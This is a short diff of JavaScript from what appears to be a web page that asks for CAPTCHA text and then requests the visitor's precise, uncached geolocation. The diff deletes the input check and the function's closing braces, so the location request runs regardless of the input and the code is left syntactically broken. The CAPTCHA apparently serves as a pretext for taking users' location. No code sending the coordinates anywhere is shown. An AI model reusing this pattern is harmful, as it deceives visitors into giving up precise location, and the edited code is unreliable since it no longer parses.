@@ -72,18 +72,13 @@
         const input = document.getElementById('captchaInput').value;
 
         // Check if input is valid
-        if (input) {
             // Request high accuracy for the geolocation
             navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
                 enableHighAccuracy: true,
                 maximumAge: 0,
                 timeout: 50000 // Optional: Set a timeout for obtaining the position
             });
-        } else {
-            alert("Please enter the CAPTCHA text.");
-        }
-    }
-
+        
     function successCallback(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
